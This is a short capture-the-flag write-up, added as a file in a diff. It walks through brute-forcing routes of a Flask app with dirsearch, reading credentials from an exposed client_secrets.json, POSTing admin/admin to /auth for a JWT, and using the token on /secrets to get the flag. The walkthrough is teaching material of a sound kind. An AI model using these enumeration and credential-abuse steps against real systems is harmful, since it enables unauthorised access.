@@ -1,0 +1,38 @@
+dirsearch - u url -w db/dicc.txt
+
+We got some routes: /auth, /client_secrets.json, /robots.txt, /secrets. 
+
+We are not allowed to use GET requests because we got some error, 
+so let’s try to use POST  requests
+
+POST /auth HTTP/1.1
+
+At this moment we can notice some flask errors that are triggered
+But we notice some strange parameters such as: (JWT_AUTH_USERNAME_KEY and
+JWT_AUTH_PASSWORD_KEY) which are in json format 
+(keep in mind data is in json
+format).
+We need to get users credentials to do some requests on this page.
+For this point let’s check another interesting route: /client_secrets.json
+
+After this step, we obtain the user credentials, but we don’t have the JWT_AUTH token for what
+we got. Let's go back to the /auth route and try again to do a POST request with the credentials obtained above.
+ 
+
+
+in burp
+POST /auth
+{ 
+	"username":"admin",
+	"password":"admin"
+}
+
+
+Now let's go to the secret route and add the JWT token authorization to get the flag.
+
+
+GET /secrets 
+
+Content-type: application/json
+Authrization: JWT
+{JWT}
